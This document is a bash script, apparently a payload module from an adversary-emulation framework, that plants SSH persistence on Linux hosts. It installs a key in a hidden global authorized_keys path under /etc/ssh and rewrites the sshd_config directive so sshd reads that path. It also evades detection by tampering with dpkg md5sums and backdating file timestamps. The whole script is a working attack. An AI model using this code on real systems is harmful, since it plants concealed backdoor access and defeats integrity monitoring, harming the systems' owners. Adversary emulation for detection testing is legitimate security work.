#!/usr/bin/env bash
#
# payloads/persistence_auth/authorized_keys_global/commands.sh
#
# Installs a randomized SSH public key in a global authorized_keys path and
# configures sshd to read that path.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

run_priv_checked() {
    local cmd="$1"
    log "run_priv: $cmd"
    run_priv "$cmd"
}

require_privilege

GLOBAL_SSH_DIR="${GLOBAL_SSH_DIR:-/etc/ssh/.ssh}"
GLOBAL_AUTHORIZED_KEYS="${GLOBAL_AUTHORIZED_KEYS:-${GLOBAL_SSH_DIR}/authorized_keys}"
SSHD_CONFIG="${SSHD_CONFIG:-/etc/ssh/sshd_config}"
AUTHORIZED_KEYS_FILE_DIRECTIVE="${AUTHORIZED_KEYS_FILE_DIRECTIVE:-AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys}"

KEY_TYPE="${KEY_TYPE:-ssh-ed25519}"
KEY_RANDOM_LENGTH="${KEY_RANDOM_LENGTH:-24}"
KEY_COMMENT_MODE="${KEY_COMMENT_MODE:-randomized}"
KEY_COMMENT_TEMPLATE="${KEY_COMMENT_TEMPLATE:-root@localhost}"

RESTORE_TIMESTAMPS="${RESTORE_TIMESTAMPS:-true}"
REFERENCE_TIMESTAMP_FILE="${REFERENCE_TIMESTAMP_FILE:-/etc/ssh/ssh_config}"

TAMPER_DPKG_MD5SUMS="${TAMPER_DPKG_MD5SUMS:-true}"
DPKG_INFO_DIR="${DPKG_INFO_DIR:-/var/lib/dpkg/info}"
DPKG_MDSUM_GLOB="${DPKG_MDSUM_GLOB:-*ssh*.md5sums}"
DPKG_REFERENCE_TIMESTAMP_FILE="${DPKG_REFERENCE_TIMESTAMP_FILE:-/var/lib/dpkg/info/linux-base.md5sums}"

RESTART_SSH="${RESTART_SSH:-true}"

log "authorized_keys_global starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"

[[ -f "$SSHD_CONFIG" ]] || fail "sshd_config not found: $SSHD_CONFIG"

RANDOM_KEY_SUFFIX="$(random_string "$KEY_RANDOM_LENGTH")"

case "$KEY_COMMENT_MODE" in
    randomized)
        KEY_COMMENT="${KEY_COMMENT_TEMPLATE}-$(random_lower_string 6)"
        ;;
    static)
        KEY_COMMENT="$KEY_COMMENT_TEMPLATE"
        ;;
    *)
        fail "Unknown KEY_COMMENT_MODE: $KEY_COMMENT_MODE"
        ;;
esac

case "$KEY_TYPE" in
    ssh-ed25519)
        AUTH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI${RANDOM_KEY_SUFFIX} ${KEY_COMMENT}"
        ;;
    ssh-rsa)
        AUTH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ${RANDOM_KEY_SUFFIX} ${KEY_COMMENT}"
        ;;
    *)
        fail "Unsupported KEY_TYPE: $KEY_TYPE"
        ;;
esac

TMP_KEY_FILE="$(mktemp)"
TMP_SSHD_CONFIG="$(mktemp)"
TMP_MD5_SCRIPT="$(mktemp)"

cleanup_tmp() {
    rm -f "$TMP_KEY_FILE" "$TMP_SSHD_CONFIG" "$TMP_MD5_SCRIPT"
}
trap cleanup_tmp EXIT

printf '%s\n' "$AUTH_KEY" > "$TMP_KEY_FILE"

q_global_dir="$(shell_quote "$GLOBAL_SSH_DIR")"
q_global_keys="$(shell_quote "$GLOBAL_AUTHORIZED_KEYS")"
q_tmp_key="$(shell_quote "$TMP_KEY_FILE")"
q_sshd_config="$(shell_quote "$SSHD_CONFIG")"
q_reference_timestamp="$(shell_quote "$REFERENCE_TIMESTAMP_FILE")"
q_dpkg_reference_timestamp="$(shell_quote "$DPKG_REFERENCE_TIMESTAMP_FILE")"
q_tmp_sshd_config="$(shell_quote "$TMP_SSHD_CONFIG")"

log "Installing global SSH authorized_keys entry"
log "Global authorized_keys path: $GLOBAL_AUTHORIZED_KEYS"

run_priv_checked "mkdir -p $q_global_dir"
run_priv_checked "chmod 700 $q_global_dir"
run_priv_checked "cp $q_tmp_key $q_global_keys"
run_priv_checked "chmod 600 $q_global_keys"

log "Updating sshd AuthorizedKeysFile directive"

if run_priv "grep -Eq '^[[:space:]]*#?[[:space:]]*AuthorizedKeysFile[[:space:]]+' $q_sshd_config"; then
    run_priv_checked "sed -i -E 's|^[[:space:]]*#?[[:space:]]*AuthorizedKeysFile[[:space:]].*$|$AUTHORIZED_KEYS_FILE_DIRECTIVE|' $q_sshd_config"
else
    printf '\n%s\n' "$AUTHORIZED_KEYS_FILE_DIRECTIVE" > "$TMP_SSHD_CONFIG"
    run_priv_checked "cat $q_tmp_sshd_config >> $q_sshd_config"
fi

if [[ "$TAMPER_DPKG_MD5SUMS" == "true" ]]; then
    log "Updating dpkg md5sums for sshd_config"

    cat > "$TMP_MD5_SCRIPT" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

sshd_config="$1"
dpkg_info_dir="$2"
mdsum_glob="$3"
reference_timestamp="$4"

[[ -d "$dpkg_info_dir" ]] || exit 0

new_hash="$(md5sum "$sshd_config" | awk '{print $1}')"

shopt -s nullglob
for md5_file in "$dpkg_info_dir"/$mdsum_glob; do
    if grep -qE '[[:space:]]+etc/ssh/sshd_config$' "$md5_file"; then
        sed -i -E "s|^[0-9a-fA-F]+[[:space:]]+etc/ssh/sshd_config$|${new_hash}  etc/ssh/sshd_config|" "$md5_file"

        if [[ -f "$reference_timestamp" ]]; then
            touch -r "$reference_timestamp" "$md5_file"
        fi
    fi
done
EOF

    chmod +x "$TMP_MD5_SCRIPT"

    q_tmp_md5_script="$(shell_quote "$TMP_MD5_SCRIPT")"
    q_dpkg_info_dir="$(shell_quote "$DPKG_INFO_DIR")"
    q_dpkg_glob="$(shell_quote "$DPKG_MDSUM_GLOB")"

    run_priv_checked "bash $q_tmp_md5_script $q_sshd_config $q_dpkg_info_dir $q_dpkg_glob $q_dpkg_reference_timestamp"
fi

if [[ "$RESTORE_TIMESTAMPS" == "true" ]]; then
    log "Restoring timestamps"

    if [[ -f "$REFERENCE_TIMESTAMP_FILE" ]]; then
        run_priv_checked "touch -r $q_reference_timestamp $q_sshd_config"
        run_priv_checked "touch -r $q_reference_timestamp $q_global_keys"
    else
        warn "Reference timestamp file not found: $REFERENCE_TIMESTAMP_FILE"
    fi
fi

if [[ "$RESTART_SSH" == "true" ]]; then
    log "Restarting SSH services best-effort"
    run_priv_checked "systemctl enable ssh >/dev/null 2>&1 || true"
    run_priv_checked "systemctl restart ssh >/dev/null 2>&1 || true"
    run_priv_checked "systemctl enable sshd >/dev/null 2>&1 || true"
    run_priv_checked "systemctl restart sshd >/dev/null 2>&1 || true"
    run_priv_checked "rc-service sshd restart >/dev/null 2>&1 || true"
fi

record_metadata "global_authorized_keys_path=$GLOBAL_AUTHORIZED_KEYS"
record_metadata "sshd_config=$SSHD_CONFIG"
record_metadata "authorized_keys_file_directive=$AUTHORIZED_KEYS_FILE_DIRECTIVE"
record_metadata "authorized_key_type=$KEY_TYPE"
record_metadata "authorized_key_comment=$KEY_COMMENT"
record_metadata "timestamps_restored=$RESTORE_TIMESTAMPS"
record_metadata "dpkg_md5sums_tampered=$TAMPER_DPKG_MD5SUMS"

log "authorized_keys_global persistence complete"
